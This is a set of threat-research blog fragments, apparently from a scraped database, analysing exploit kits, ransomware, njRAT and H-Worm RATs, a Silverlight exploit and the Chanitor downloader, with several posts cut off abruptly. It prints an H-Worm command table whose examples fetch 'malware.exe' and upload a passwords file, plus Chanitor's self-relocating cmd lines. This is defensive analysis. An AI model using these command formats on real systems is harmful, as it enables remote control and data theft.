landing pages hosted on a variety of domain-shadowed hostnames:    far[.]capacitorsfordownhole[.]com  min[.]closinglawyer[.]net  deal[.]customdetonatorcapacitor[.]com  road[.]detonationcapacitor[.]com  home[.]autoqueen[.]net  calls[.]hightempcaps[.]com  add[.]hightempceramiccaps[.]com  top[.]highfrequencycapacitors[.]com  take[.]buriedbroadbandcapacitors[.]com  pro[.]customdetonatorcapacitor[.]com    An example of the redirector and two-stage landing page:               	  		  			  		  		  			Two-stage landing page  		  	                 Analysis of the URI paths on the landing pages shows that there are a few distinct parts. In the example above, the path “?xXmNd7GfKB7KA4M=l3SKfPrfJxzFGMSUb-nJDa9GPkXCRQLPh4SGhKrXCJ-ofSih17OIFxzsmTu2KV_OpqxveN0SZFT_zR3AaQ4ilotXQB5MrPzwnEqWwxWeioWA_0TfZl4W-5rBHbU6iw6gyLRGJMlzk0TQu2gCz-kaUEgbrA” features two distinct components separated by an equal sign (“=”). The first part (“xXmNd7GfKB7KA4M”) appears to be a unique client identifier while the much longer second part appears to be related to the overall campaign, with the same characters starting the string.

We’ve noted that the ultimate goal of many exploit kits is to monetize the infected system as much as possible, most commonly via Adfraud/ClickFraud. To support this goal, a very common payload for exploit kits is the Trojan Bedep, which can download additional malware and is used to perpetrate advertising fraud. In order to evade detection, Bedep is usually downloaded in an encrypted form and decrypted in memory as part of the infection process. Once decrypted, Bedep uses a domain generation algorithm (DGA) to communicate with its command and control servers. This communication is over normal HTTP, but messages are encrypted and then Base64 encoded, making analysis and detection more difficult.    When used for advertising fraud, Bedep creates a hidden desktop (a desktop instance not visible to the end user), shown below, that is not normally accessible in Windows, then begins displaying loading web pages and advertisements to commit advertising fraud.              	  		  			  		  		  			Bedep Adfraud traffic & hidden desktop used to display Ads  		  	         Multiple windows are created to display ads (shown below) and in practice, this heavily impacts the performance of the infected system.         	  		  			  		  		  			Bedep displaying multiple Ads on hidden desktop  		  	           Pages are quickly cycled to make as much money from the Ads as possible. In general, Bedep’s Adfraud traffic takes the form of ‘/r.php?key=’ or ‘/ads.php?sid=’ followed by a 32-character alphanumeric string, for example:    keppertoolsmaster[.]com/r.php?key=722445fbcd3e90f18f451c1344bdcc85  Another popular payload for exploit kits is ransomware, such as CryptoLocker and CryptoWall. This type of ransomware encrypts files on an infected system, and then demands payment to decrypt the files. CryptoLocker was first discovered in 2013 and quickly became popular due to the use of asymmetric encryption to hold user’s files for ransom, which is expected to be paid in Bitcoins. Additionally, recent samples contact a command and control infrastructure hosted on TOR hidden servers via TOR proxy gateways, such as tor2web.org. ThreatLabZ recently analyzed a sample of CryptoWall 3.0, a derivative clone of CryptoLocker, and found the binaries were hosted with a “.jpg” extension to avoid raising suspicion. Some of the other features of this CryptoWall sample include:      	Decryption service hosted on TOR  	CAPTCHA on decryption service  	High ransom amount (700 USD, increasing to over 1400 USD)  	Multiple payment options accepted besides Bitcoin    Ransomware is an attractive payload for criminals since many individuals and companies with no or incomplete data backups are likely to pay the ransom to recover sensitive files. Since the victim’s files are already encrypted, there is little to fear from traditional anti-virus signatures or blocking command and control traffic. Finally, even if someone pays the ransom, there is no guarantee that any files will be decrypted.    Multi-tasking example from a recent infection  A recent development we’ve observed is using Bedep to install ransomware as well as committing advertising fraud. In the observed sample, Angler EK first installed Bedep on the compromised system, which immediately downloaded a piece of ransomware called “Threat Finder v2.4.” Like other popular ransomware, Threat Finder displays a “HELP_DECRYPT” message which instructs users to send 300 USD of Bitcoins to a Bitcoin wallet in order to decrypt files. The screenshot below shows both the Threat Finder ransom window and advertising fraud sessions captured by Fiddler. Installing both ransomware and committing advertising fraud potentially generates even more money for the perpetrators.              	  		  			  		  		  			Threat Finder v2.4, Bedep, dual infection  		  	                	  		  			  		  		  			Trust us, we\'ll decrypt your files.... but only if you pay!  		  	         Conclusion  Malvertising campaigns have seen a significant uptick in 2015 and continue to be the most lucrative initial delivery mechanism for Exploit Kits. The fact that the legitimate websites becoming target of these campaigns have very little to no control for preventing such attacks makes this a very dangerous vector and a popular choice for cybercriminals.    The users should ensure that all the Browser application plugins are always patched with latest updates and disable the plugins that are not used. We also highly recommend using click-to-play feature available in many browser for Java & Flash plugins.

Attackers leverage anonymizer networks such as TOR to cover their tracks when accepting any payment from their victims.\r\n\r\nIn this blog, we cover a campaign involving CryptoWall 3.0 ransomware. The attack campaign that we are monitoring involves malicious executable files disguised as JPEG image files. The URL format for these downloads adheres to the following patterns:\r\n \r\nhttp://[domainname]/images/[one|two].jpg\r\nNameserver used: ns[1-4].dervoilrtd.org\r\n\r\n \r\nSample URLs serving CryptoWall 3.0\r\n\r\n\r\n\r\n	dorttlokolrt[.]com/images/one[.]jpg\r\n	dorttlokolrt[.]com/images/two[.]jpg\r\n	indsertgamert[.]org/images/one[.]jpg\r\n	indsertgamert[.]org/images/two[.]jpg\r\n	davis1[.]ru/images/one[.]jpg\r\n	davis1[.]ru/images/two[.]jpg\r\n	downs1[.]ru/images/one[.]jpg\r\n	downs1[.]ru/images/two[.]jpg\r\n	ellison1[.]ru/images/one[.]jpg\r\n	ellison1[.]ru/images/two[.]jpg\r\n	manning1[.]ru/images/one[.]jpg\r\n	manning1[.]ru/images/two[.]jpg\r\n\r\n\r\nThe downloaded file deletes the original copy of itself and begins encrypting all the victim\'s files using an asymmetric encryption method.  For each file it encrypts, it leaves behind a HELP_DECRYPT.[PNG|HTML|TXT|URL] file to instruct the victim on how to recover their files. \r\n\r\n \r\n\r\n\r\n \r\n\r\n \r\n \r\n\r\nFollowing a successful infection cycle, the end-user will be shown a pop-up of the HELP_DECRYPT file to make sure that the victim is fully aware of the attack on their system. The instructions contain a TOR link to recover their now encrypted sensitive files. Following the links from the HELP_DECRYPT file leads to a Decryption Service page performing a CAPTCHA check to ensure it\'s a human on the other end.\r\n\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			CAPTCHA check for Decryption Service page\r\n		\r\n	\r\n\r\n\r\n \r\n\r\n\r\n\r\nThe malware performs a POST request to the following domains relaying the data from the victim\'s system to one of the following Command & Control (C&C) servers:\r\n\r\n\r\n	alkhatip[.]com\r\n	aseanian[.]com\r\n	bijouxbjx[.]com\r\n	buildtrue[.]com\r\n	corporatemonks[.]com\r\n	eturedesigns[.]com\r\n	futong8[.]com\r\n	geiliyou[.]com\r\n	houseofstarz[.]com\r\n	hscompany[.]net\r\n	ineshworld[.]com\r\n	iuliasalaria[.]org\r\n	judora-ng[.]com\r\n	leutezentrum[.]com\r\n	miguelations[.]com\r\n	ocarma[.]org\r\n	ocvitcamap[.]com\r\n	ouarzazateonline[.]com\r\n	ruanlianjie[.]net\r\n	sapacmold[.]com\r\n	spark-leds[.]com\r\n	trillyo[.]com\r\n	ubikate[.]mx\r\n	weapex[.]com\r\n	www[.]ebouw[.]nl\r\n	www[.]getserved[.]nl\r\n	www[.]multiposting[.]nl\r\n	www[.]ubikate[.]mx\r\n\r\nThe following URI format is observed across all POST transactions:\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			/img[/d].php?[a-z]=[string]\r\n		\r\n	\r\n\r\nThese beaconing activities take place for the duration of the compromise to C&C servers seen around the world.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Unique C&C locations\r\n		\r\n	\r\n\r\n\r\nOnce infected, CryptoWall 3.0 puts the victim on an extortion countdown. The ransom amount doubles at each threshold set by the attacker.

Angler continues to utilize malvertising to push landing pages and malicious actors are still registering domains solely for serving exploits, but recently, we\'ve noticed an increase in two new infection vectors - 302 Cushioning and Domain Shadowing.    302 Cushioning, or a \'cushion attack\', is used to redirect victims to malicious sites without the use of more traditional techniques, such as hidden iframes or external \'script src\' tags. The attackers are using HTTP 302 redirects over iframes here to evade detection by traditional signature-based IDS/IPS engines. This technique is not new and was discussed back in 2013. Domain shadowing, a term coined by Cisco, involves compromising the parent domain and creating multiple sub-domains that point to malicious code. This means that in the majority of cases, a victim\'s hosting account credentials are compromised. These sub-domains can be created and deleted quickly, making this an attractive technique for bypassing domain and URL blocklists.    These developments are notable since they show an evolving approach to exploit delivery. Angler has long used obfuscation and encryption on landing pages and payloads Combined with cushioning and domain shadowing, Angler adds yet another layer of stealth for defenders to counter.     Exploit Cycles  The exploit cycle typically starts with compromised websites followed by a 302 Cushioning attack & Domain Shadowing leading to an Exploit Kit hosting site as seen below:      	  		  			  		  		  			Fig 1: Exploit cycle seen during these attacks  		  	    Direct exploitation, as shown below, happens immediately when accessing the compromised site.            	  		  			  		  		  			Fig 2: Wireshark showing direct path to exploit  		  	    The full cycle from victim site to successful exploitation is shown in the annotated Fiddler screenshot below.       	  		  			  		  		  			Fig 3: Full sample exploit cycle  		  	    Session 2 (above) corresponds to the initial 302 cushion upon accessing the victim site (detailed in Fig 2). Session 3 contains a small block of code (Fig 4 below) to initiate session 4. Session 4 302\'s to the actual Angler landing page in session 5.       	  		  			  		  		  			Fig 4: Initiate session 4 via top.location.replace  		  	    Note that the sub-domain changes between sessions 4 and 5:       	  		  			  		  		  			Fig 5: Sub-domain change for landing page  		  	    Indirect exploitation is similar to the direct exploitation method described above, but occurs after a domain is accessed that utilizes remotely hosted content. Once the content is accessed, there is a similar 302 cushion to the exploit domain.       	  		  			  		  		  			Fig 6: 302 cushion from intermediary domain  		  	           	  		  			  		  		  			Fig 7: Domain graph showing indirect exploitation  		  	      Landing Page Analysis  The landing page for Angler is typical, with a substantial amount of randomized code and whitespace, but scrolling to the bottom reveals that there are multiple strings delimited with \'3~4\' and the split function is declared toward the top of the page.       	  		  			  		  		  			Fig 8: Split function for 3~4  		  	           	  		  			  		  		  			Fig 9: Delimited string simply uses fromCharCode  		  	    This is followed by an \'eval\' of the variable \'kzfzSU\' which contains the deobfuscated code:       	  		  			  		  		  			Fig 10: eval(deobfuscated code)  		  	    Taking a look at the deobfuscated code, there are several structures that are consistent with well-known exploits being served, including functions for \'flash_run\' and \'GetSLV\':       	  		  			  		  		  			Fig 11: IE11 - CVE-2014-4130   		  	        	  		  			  		  		  			Fig 12: flash_run - Flash CVE-2015-0336  		  	           	  		  			  		  		  			Fig 13: GetSLV - Silverlight CVE-2013-0074  		  	           	  		  			  		  		  			Fig 14: IE 10 - CVE-2013-2551  		  	    The majority of this is standard and has been documented by many researchers. Kafeine has done an excellent job chronicling Angler and other exploit kits and additional information on the landing page exploits can be found on his pastebin.     Exploits & Payload  The exploit we examined was Flash exploit CVE-2015-0336. One interesting point is that the SWF file was LZMA compressed, which appears to be an attempt to evade detection.       	  		  			  		  		  			Fig 15: LZMA compressed SWF exploit payload  		  	    The SWF takes a parameter, which is an encrypted URL pointing to the location of the binary payload that is executed upon successful exploitation. The binary payload is also encrypted:       	  		  			  		  		  			Fig 16: Encrypted malware payload  		  	      VirusTotal detection on the SWF was very poor with only 1/56 vendors alerting at time of upload.       	  		  			  		  		  			   		  	      The malware payload dropped at the end of a successful exploit cycle belongs to the Carberp Banking Trojan family. The Carberp Trojan family is known for stealing online banking credentials as well as user credentials for a variety of applications. It is also capable of downloading additional malware on the victim machine. It\'s important to note that the payload is downloaded in an encrypted form and decrypted in memory on the victim machine before being executed by the SWF exploit payload.    The malware binary has better detection coverage with 31/57 AV engines presently providing detection.         Conclusion  A 302 Cushioning attack combined with a Domain Shadowing technique is clearly aimed to exploit the current enterprise security posture which still relies heavily on URL categorization and Domain based blocking. With the growing threat landscape, enterprises have started to adopt multiple security solutions to guard their perimeter; however, it is still common for these enterprises to leverage URL categorization to further decide on which traffic goes through some of the more advanced layers of security inspection. Domain Shadowing techniques will cause these attacks to slip through such security policies.    It will not be surprising to see an increase in the usage of these techniques by the cyber-criminals in future attack campaigns. We at ThreatLabZ are closely monitoring this attack vector and ensuring protection for the Zscaler customers.

As is usual with events that have such a level of interest, bad actors across the internet will be trying to get their cut of the action through topical spam advertising and phishing as well as search engine poisoning to draw ad revenue and in some cases, deliver malicious software. Though it is still early in the cycle of March Madness interest, we have seen a bit of everything: malware purporting to be NCAA bracket templates, a rash of ad-filled sites running March Madness related SEO campaigns, and the usual complement of shady streaming sites promising live streams of the tournament games (with some delivering a nasty surprise).         	  		  			  		  		  			NCAA Tournament related traffic shows a sharp uptick as the games began.  		  	           	  	        NCAA Bracket Download Leads to Malware           While reviewing some of the tournament-related security blocks, we spotted an interesting file download attempt. It\'s not clear if the original click was derived from a search, but the primary link purports to be a zipped PDF file that can be used to create personalized brackets. The link ultimately directs to an unwanted EXE signed by the Ukranian publisher BERSHNET LLC (whose history is well documented on HerdProtect).                	  		  			  		  		  			The downloaded file features a valid Authenticode Certificate.  		  	           The binary features an unusual number of protections against analysis for what appears to be simple adware. At this time, we have not fully explored the capabilities of the binary, but analysis shows that the sample gathers system information and sends it to a CloudFlare-hosted command & control server.         	  		  			  		  		  			HTTP Check-in activity includes POSTing system information.  		  	             	  	        Fake .tk Blogs Generate Ad Revenue and Expose Users      Numerous ad-filled and auto-generated blogs have been popping up to take advantage of unwary search-engine users looking for bracket templates and related web-searches. While we have not seen any overtly malicious behavior on these sites, they represent a potential threat against the unwary searcher.                 	  		  			  		  		  			   		  	        	  		  			  		  		  			Auto-generated blogs taking advantage of popular search terms.  		  	            An interesting trend among these sites is the use of the free country TLD .tk. This isn\'t too surprising since the use of free domains is similar to the use of a dynamic DNS service, but the .tk TLD is slightly less conspicuous compared to no-ip.com or other common alternatives.       Streaming Scams Deliver Malware    Similar to sites offering bracket templates and insights on the match-ups, a large number of sites promising the ability to stream NCAA games have popped up to capture search traffic and generate ad-revenue. Unlike the SEO blogs, we have spotted -- and blocked -- malicious downloads related to tournament streams.         	  	        	  		  			  		  		  			Numerous scam sites are found among the top Google hits.  		  	        	  		  			  		  		  			Fake streaming site is filled with ads and fake plug-in install prompts.  		  	        	  		  			   		  	          	  		  			  		  		  			Download page for fake plug-in emulates Adobe look and feel.  		  	             	  	           Although this binary does not initially appear as sophisticated as the fake-bracket sample above, it downloads two supplemental encrypted files, one large binary blob and one base-64 encoded text file. Further analysis is needed to enumerate all functionality, but the malware can be observed collecting system information and sending it to a remote server.           	  		  			  		  		  			Post-infection activity downloads another binary and POSTs system information.  		  	             	  	             	  	      It should be noted that the NCAA has put tight restrictions on the streaming of the tournament, and apart from the first round, streaming the games requires a pay-TV subscription.       Conclusion           All of these examples should highlight the diversity of threats that latch on to the popularity of March Madness.

There are a variety of .NET obfuscation tools that make detection difficult for antivirus solutions and hinders analysis by security researchers. njRAT utilizes dynamic DNS for command and control (C2) servers and communicates using a custom TCP protocol over a configurable port.\r\n\r\n \r\n\r\nThe C&C callback from the infected system includes following information:\r\n\r\n\r\n	Bot identifier (based off configurable string in builder & volume serial number)\r\n	Computer name (Base 64 encoded)\r\n	Operating system information\r\n	Existence of attached webcam (Yes/No)\r\n	Bot version\r\n	Country code\r\n	Title of the active process window\r\n\r\n\r\nBelow is a sample C&C message:\r\n\r\n \r\n\r\n253 ll|\'|\'|TW9pXzUwRkFBNTQw|\'|\'|247525|\'|\'|Win7 64Bit|\'|\'|79-11-30|\'|\'||\'|\'|Win7 Enterprise SP1 x64|\'|\'|No|\'|\'|0.7d|\'|\'|..|\'|\'|QWRtaW5pc3RyYXRvcjogQzpcV2luZG93c1xzeXN0ZW0zMlxjbWQuZXhlIC0gYzpcUHl0aG9uMjdccHl0aG9uLmV4ZSAgc2ltcGxlX3NvY2tldF9zZXJ2ZXIucHkA|\'|\'|\r\n\r\nDecoded Base64 string #1 (botID_volume-serial-number): Moi_50FAA540\r\nDecoded Base64 string #2 (currently focused window): Administrator: C:\\Windows\\system32\\cmd.exe - \r\n \r\n\r\nnjRAT allows the remote attacker to perform following activities on the infected system:\r\n\r\n\r\n\r\n	File system changes\r\n	Log keystrokes\r\n	Download and execute a remote file\r\n	Remote desktop\r\n	Webcam access\r\n	Microphone access\r\n	Obtain user credentials for multiple applications\r\n	Reverse command shell\r\n\r\n\r\n\r\nThe latest instances of njRAT infections we have seen are for version 0.7d. Below are some screenshots of the njRAT\'s control panel accessible to the attacker:\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			njRAT C&C control panel\r\n		\r\n	\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			njRAT builder panel\r\n		\r\n	\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			njRAT author information\r\n		\r\n	\r\n\r\n \r\n\r\nH-Worm\r\n\r\n \r\n\r\nH-Worm is a VBS (Visual Basic Script) based RAT which we believe is derived off the njRAT source code. H-Worm provides cyber-criminals similar controls to njRAT. It also uses dynamic DNS for its C&C servers but unlike njRAT it uses POST requests and the HTTP User-Agent field to exfiltrate sensitive information from the infected machine.\r\n\r\nThe C&C communication POST requests typically uses parameters \'cmd\' and \'param\' as seen in the table below:\r\n\r\n \r\n\r\n\r\n	H-Worm Bot Command Summary\r\n	\r\n		\r\n			Bot Command\r\n			Description\r\n			Example\r\n			Connection URI\r\n		\r\n		\r\n			execute\r\n			Execute vb code sent in response\r\n			execute<|>vbscript code\r\n			None\r\n		\r\n		\r\n			update\r\n			Update bot code to provided code (overwrites existing file)\r\n			update<|>new vbscript bot code\r\n			None\r\n		\r\n		\r\n			uninstall\r\n			Removes the bot from the victim machine\r\n			uninstall\r\n			None\r\n		\r\n		\r\n			send\r\n			Downloads content from a URL and dumps at a directory\r\n			send<|>http://www.example.com/malware.exe<|>c:\\\r\n			None\r\n		\r\n		\r\n			site-send\r\n			Downloads content from a URL and saves with specified nam\r\n			site-send<|>http://www.example.com/script.vbs<|>c:\\script.vbs\r\n			None\r\n		\r\n		\r\n			recv\r\n			Uploads a file to the C2 domain\r\n			recv<|>C:\\Users\\User\\Documents\\passwords.txt\r\n			POST /is-recving\r\n		\r\n		\r\n			enum-driver\r\n			Sends information on the victim\'s system drives\r\n			enum-driver\r\n			POST /is-enum-driver\r\n		\r\n		\r\n			enum-faf\r\n			Sends a directory listing for a given path\r\n			enum-faf<|>C:\\Users\\User\\\r\n			POST /is-enum-path\r\n		\r\n		\r\n			enum-process\r\n			Sends the process listing of the victim\'s system\r\n			enum-process\r\n			POST /is-enum-process\r\n		\r\n		\r\n			cmd-shell\r\n			Run a command via \'%comspec% /c\' on the infected host\r\n			cmd-shell<|>calc.exe\r\n			POST /is-cmd-shell\r\n		\r\n		\r\n			delete\r\n			Deletes a specified file or folder from the victim\'s system\r\n			delete<|>C:\\Users\\User\\Documents\\\r\n			None\r\n		\r\n		\r\n			exit-process\r\n			Kills the specified process ID via taskkill\r\n			exit-process<|>123\r\n			None\r\n		\r\n		\r\n			sleep\r\n			Sets the number of milliseconds to sleep between \'ready\' beacons (default 5000)\r\n			sleep<|>10000\r\n			None\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nThe C&C callback from an infected system includes following information in the User-Agent field:\r\n\r\n\r\n	Bot identifier (based off configurable string in builder & volume serial number)\r\n	Computer name\r\n	Username\r\n	Operating system information\r\n	Bot version\r\n	Antivirus information (Default value \'nan-av\')\r\n	USB spreading [true/false] with date obtained from bot\'s registry entry.\r\n\r\n\r\nBelow are some screenshots of H-Worm\'s control panel accessible to the attacker, from two different variants:\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			H-Worm plus version C&C control panel\r\n		\r\n	\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			H-Worm control center [similar to njRAT\'s Manager]\r\n		\r\n	\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			H-Worm plus version builder panel\r\n		\r\n	\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			H-Worm extended/lite version C&C control panel\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nWe continue to see many new variants of H-Worm popping up in the wild. Below are the version strings from some of the active H-Worm variants we have been tracking in 2015:\r\n\r\n	2.0\r\n	3az version\r\n	hello\r\n	KKMM NICE PC\r\n	mod version\r\n	plus\r\n	POUSSIN\r\n	safa7_22\r\n	SKY ESP PC\r\n	spupdate\r\n	the KR.joker worm\r\n	underworld final\r\n	v1.8.3  By AB DELL\r\n	v1.8.7  By AB DELL\r\n	worm Of Dz-47\r\n	WORM OF DZ-47\r\n\r\nBelow is the Geo distribution of the active Command & Control servers we have oberved thus far in 2015:\r\n \r\n\r\n\r\nOne of the most popular features of this RAT family is the usage of Dynamic DNS for its Command & Control server communication. We have seen multiple sub-domains from the following Dynamic DNS domains in 2015 being abused by the malware authors for C&C communication:\r\n\r\n	adultdns.net\r\n	cable-modem.org\r\n	dz47.cf\r\n	ddns.net\r\n	dnsd.info\r\n	dvr-ddns.com\r\n	dyndns.org\r\n	dynu.net\r\n	ftp21.net\r\n	mooo.com\r\n	myq-see.com\r\n	no-ip.biz\r\n	noip.me\r\n	no-ip.org\r\n	redirectme.net\r\n	sells-it.net\r\n	servecounterstrike.com\r\n	serveftp.com\r\n	servehttp.com\r\n	servequake.com\r\n	sytes.net\r\n	user32.com\r\n	zapto.org\r\n\r\nConclusion\r\n\r\nnjRAT & H-Worm variant infections continue to rise, and while this threat is reportedly more prevalent in the Middle-East region, we continue to see infections in other parts of the world as well. Despite Microsoft\'s attempts to disrupt the C&C channel for this notorious RAT back in June 2014, we continue to see the usage of various dynamic DNS services by the malware authors for it\'s C&C server communication. It remains one of the most popular and prevalent RATs in the wild today.\r\n\r\nZscaler ThreatLabZ has deployed multiple layers of protection against this threat to ensure that the customers are protected.\r\n\r\nPast reports on this threat\r\nhttp://www.fidelissecurity.com/sites/default/files/FTA_1009-njRAT_Uncovered_rev2.pdf\r\nhttp://www.fidelissecurity.com/sites/default/files/FTA%201010%20-%20njRAT%20The%20Saga%20Continues.pdf\r\nhttp://phishme.com/the-return-of-njrat/\r\nhttp://blog.trendmicro.com/trendlabs-security-intelligence/new-rats-emerge-from-leaked-njw0rm-source-code/\r\nhttp://www.symantec.com/connect/blogs/simple-njrat-fuels-nascent-middle-east-cybercrime-scene\r\nhttps://blogs.mcafee.com/mcafee-labs/trail-njrat\r\nhttps://www.fireeye.com/blog/threat-research/2013/09/now-you-see-me-h-worm-by-houdini.html\r\n\r\nAnalysis by Deepen Desai & John Mancuso', 'Evasion/Stealth;Malware', 'https://www.zscaler.com/blogs/research/njrat-h-worm-variant-infections-continue-rise');

Currently, this application is ranked among the top 200 apps in the Social Networking category on the iTunes app store. Tinychat claims 5 million minutes of usage per day, making it one of the largest voice and video chat communities on the Internet today.    A user must submit their email address and password in order to create an account. Alternately, a user can also use their Facebook or Twitter account to login to this application.               Vulnerability - Clear text username/password           	  		  			  		  		  			App Login page  		  	      The current Tinychat App (verified on Version 5.0) has a serious information leakage flaw whereby username & password information for the Tinychat user is sent in clear text (unencrypted) to the application server.

Conclusion:      This type of security flaw can be uncovered by simply analyzing the network traffic sent by the application. It is disappointing to see such applications getting uploaded to Apple iTunes store without basic security tests like checking for clear text username/passwords being conducted. This is not the first time we have seen a popular iOS application with this security flaw, but Apple continues to ignore performing a basic security check as part of their vetting process for adding new applications to the app store.

INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (160, 'Exploit Kits: Anatomy Of A Silverlight Exploit', 'Uday Pratap Singh', 'January 30, 2015', 'With the significant adoption of Silverlight technology in today’s market, it has become one of the popular targets for the hacker community. We have observed many popular exploit kits (EKs) like Nuclear and Fiesta, serving specially crafted exploits targeting Silverlight vulnerabilities. Recently, we blogged about the Nuclear Exploit kit live infection cycle, which was leveraging Silverlight vulnerabilities to infect the victim’s computer. In this blog, we will take a look at the Silverlight exploit payloads and how they are embedded in the Exploit kit.      A Silverlight file is a zip archive with an \".xap\" extension and it is written in the .NET language. This XAP file contains a list of one or more .NET managed assemblies (.DLL files) along with the AppManifest.XAML file.      We have observed that Exploit kits are generally targeting following Silverlight vulnerabilities:        	CVE-2013-0074: Memory Dereference Arbitrary Code Execution Vulnerability.  	This vulnerability is due to an improper boundary checking of the user supplied input which leads to arbitrary code execution.        	CVE-2013-3896: Information (memory) disclosure Vulnerability  	By exploiting this vulnerability an unauthorized attacker can gain access to the sensitive information. This bug is used to bypass the exploit mitigation technologies.  	  	  	The following is a typical infection cycle involving Silverlight exploits in EKs:                               Dissection of the Infection Cycle and Silverlight Exploit:         As we discussed in our previous blog, the landing page of the Nuclear Exploit kit is heavily obfuscated to evade Anti-virus detection. The function highlighted below is invoking the Silverlight exploit:                  As we stepped through the deobfuscated code, we found that the exploit author has implemented multiple unused variables to possibly confuse analysts. We saw a parameter named “tuti” which contains the base64 encoded data that decodes the shellcode.                  Upon successful execution of the silver_run() function, the Exploit kit will download a malicious XAP file with the following GET request.                  The downloaded XAP exploit consists of three files as shown below.                  The AppManifest.xaml file contains the deployment details needed to run the Silverlight application. The first element of it starts with a deployment node which defines the Assembly information, Runtime version, Application Entry point and the assembly extension parts. In this file, There is an attribute called \'RuntimeVersion\' through which we can target a specific version of Silverlight. There are two other important attributes, namely EntryPointAssembly & EntryPointType which are mainly used for loading the XAP file.                  Reverse engineering the .NET DLL file is straightforward, because it is MSIL (Microsoft Intermediate Language) and there are multiple tools at our disposal. We used the Telerik JustDecompile tool to decompile the DLL. The following screenshot shows us the list of the classes used by the asdgsd.dll.             The screenshot below shows the entry point routine asdgsd.App. The constructor of asdgsd.App is used to call the shlyapa class.                  The following activity is performed by the shlyapa class which attempts to exploit multiple silverlight vulnerabilities:      	Get the .NET run time environment version and store it in the “mild” variable.  	Get the base64 encoded stream from aforementioned “tuti” parameter and store it in “brae” variable and invoke the \"dips\" function.  	In parallel, the function “lout” generates the “numArray” leveraging  class “chaiki”.  	  	                	    Function \"lout\" generates the \"BitmapImage\" instance by calling function \"game\" from \"alupka\"                                                   	The function \"huts\" is leveraging CVE 2013-3896 (A memory disclosure vulnerability in the public WritableBitMap class) to calculate the base-address of \"mscorlib.ni.dll\" as seen below:                                                                	Finally, the \"dips\" function executes the \"spca\" function that takes the base-address of \"mscorlib.ni.dll\" as an argument. The \"spca\" function is triggering CVE-2013-0074 (Dereference Vulnerability during HTML object rendering) as shown below:                   The following is a sample of live Nuclear Exploit Kit domains that we have seen in past 24 hours:           Nuclear EK Domains     indyresident[.]gq    macropromise[.]ml    hybridvertex[.]gq    macropromise[.]ga    uthunilaej[.]co[.]vu    daviddaniel[.]cf    brightrolling[.]ml    culturemerge[.]ga       Conclusion:        We continue to see the Silverlight vulnerabilities mentioned in this blog being exploited by many other popular exploit kits.

Given the number of exploit attempts we are seeing for this vulnerability in the wild, it is critical for users to update the Adobe Flash player to the latest version 16.0.0.296.\r\n\r\nBackground\r\n\r\nEarlier this week, Kafeine published a blog mentioning an Angler Exploit Kit (EK) instance serving a possible zero day Adobe Flash exploit payload. The ThreatLabZ Research Team reviewed Angler Exploit Kit activity across the cloud and were able to identify multiple instances of Angler Exploit Kit hosting sites serving a new Adobe Flash payload that is able to exploit the latest Flash Player version 16.0.0.257.  [Adobe released a patch (APSB15-02) for CVE-2015-0310 today and we can confirm that the patch does not prevent exploitation of the 0day discussed in this blog. The latest version 16.0.0.287 is still vulnerable and is being actively exploited in the wild.]\r\n\r\nUpon further investigation, we discovered that this appears to be yet another case of a Malvertising campaign leading unsuspecting users to Angler EK instances. Upon successful exploitation, we observed a new variant of the Bedep Trojan getting dropped and executed on the victim machine. We tested this on a Windows 7 64-bit system and the payload dropped was a 64-bit Bedep Trojan variant which generated a high volume of AdFraud traffic from the infected system.\r\n\r\nThe affected advertising networks found in this case were:\r\n\r\n	oneclickads.net\r\n	adcash.com\r\n\r\nInfection Cycle\r\n\r\nThe infection cycle involves users visiting a legitimate site that displays certain advertisements from the compromised advertising networks, which will redirect them to an Angler EK hosting site and begin the exploit cycle. If the exploit is successful, a new variant of Bedep Trojan gets downloaded in an encrypted form and installed on the target system.\r\n\r\nThe entire infection cycle occurs silently in the background and is completely transparent to the end user.\r\n\r\n \r\n\r\nThe exploit page has the title \"Welcome to new site\" and is comprised of 220 hidden input elements, followed by three inline scripts.\r\n \r\n\r\n\r\n \r\n\r\nThe first script code snippet is obfuscated with block comment text (ie: /* random text */), but also appears purposefully broken for multiple JavaScript engines. Looking at the code, there are multiple period characters inserted throughout the script which leads to syntax errors at runtime:\r\n \r\n\r\n\r\n\r\n \r\n\r\nThe second script code snippet calls a function in the first script leading to \"eval\" and resulting in JavaScript code that performs Browser plugin detection:\r\n \r\n\r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\nThe third script code snippet drew our attention, as it is not obfuscated and simply loads an SWF object. This script serves the Adobe Flash 0-day and it is interesting to note that the script will only execute if the earlier script has thrown an error.

This malware is being delivered via phishing emails purporting to be \"important\" documents, for example, voicemails, invoices, and faxes; all are actually screensaver executables with the extension ‘.scr’. Another unique feature of this downloader Trojan family is the usage of tor2web.org and tor2web.ru over SSL for its Command & Control (C2) communication.\r\n \r\n\r\nUpon execution, Chanitor copies itself to ‘%APPDATA%\\Roaming\\Windows\\winlogin.exe’ by running the following command:\r\n\r\n \r\n\r\ncmd /D /R type \"C:\\<path-to-binary>\\winlogin.exe\" > ___ && move /Y ___ \"C:\\Users\\<username>\\AppData\\Roaming\\Windows\\winlogin.exe\"\r\n\r\n \r\n\r\nIt then waits for a few seconds before deleting the original file, and executes the copy via the following command:\r\n \r\n\r\ncmd /D /R ping -n 10 localhost && del \"C:\\<path to original exe>\" && start /B \"\" \"C:\\Users\\<username>\\AppData\\Roaming\\Windows\\winlogin.exe\" && exit\r\n \r\n\r\nOnce the command executes, it creates a registry entry for persistence:\r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\nChanitor encrypts some key components like C2 server locations that is decrypted only when used on run time. For example, \"tor2web.org\" is decrypted using a xor loop:\r\n\r\n 